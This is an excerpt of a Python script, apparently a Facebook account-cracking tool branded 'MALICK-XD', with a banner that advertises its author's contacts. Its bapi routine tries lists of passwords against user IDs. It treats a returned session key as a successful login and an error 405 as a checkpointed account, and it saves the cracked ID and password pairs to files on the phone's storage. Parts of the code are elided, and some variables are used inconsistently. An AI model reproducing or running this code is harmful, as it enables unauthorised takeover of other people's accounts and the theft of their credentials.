...
.##.....##.#########.##........##..##.......##..##..
.##.....##.##.....##.##........##..##....##.##...##.
.##.....##.##.....##.########.####..######..##....##               {green}######_____TOOL CREATED BY LEGEND MALICK_____######{white}  """)                                                                                  
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner     : MALICK-XD ")
    print(f" {white}{green}[~]{white} Facebook  : S Malick Bolte ")
    print(f" {white}{green}[~]{white} Best friends : AMIL • GOPII ")
    print(f" {white}{green}[~]{white} Tool      : LEGEND-MALICK ")
    print(f" {white}{green}[~]{white} Github    : https://github.com/LEGEND-MALICK ")
    print(f" {white}{green}[~]{white} Whatsapp  : (8266803073) Only Paid Promotion ")
...
def infinty():
    logo()
    os.system('xdg-open  /JMaQK2poEONFdCUwXM9x3A')
    print(f'{rad} Choose your option {white} ')
    print(50*'-')
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}MALICK-XD{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'\r{green}[MALICK-XD OK] {uidX} | {pw} {white}')
                    open('/sdcard/MALICK-XD OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[MAICK-XD CP] {uid}     | {pw} {white}')
                    open('/sdcard/MALICK-XD CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{green}[MALICK-XD OK] {uid} | {pw} {white}')
                    open('/sdcard/MALICK-XD OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                #uid = responce_json['error']['uid']
                if uid not in cps:
                    print(f'\r{rad}[MALICK-XD CP] {uid}     | {pw} {white}')
                    open('/sdcard/MALICK-XD CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uidX)
            else:continue
        cracked.append(uid)
